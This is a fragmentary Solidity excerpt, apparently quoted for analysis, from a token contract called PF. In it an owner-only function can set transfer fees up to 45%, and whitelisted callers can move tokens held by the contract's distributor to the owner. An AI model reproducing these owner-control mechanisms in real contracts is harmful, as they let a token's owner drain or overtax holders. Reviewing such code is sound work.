...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            uint256 swapFee = _lpDividendFee;
    ...
    function setFee(uint256 lpDividendFee) external onlyOwner {
        _lpDividendFee = lpDividendFee;
        require(lpDividendFee <= 4500, "max 45%");
    }
    ...
    function claimContractToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            _tokenDistributor.claimToken(token, _owner, amount);
        }
    }
...
contract PF is AbsToken {
    ...
    //USDT
        ...
        80000,
    //Received
        address(0x27Fa3341AeFAd46Eef94a72271459d84c6F68685)
    ){
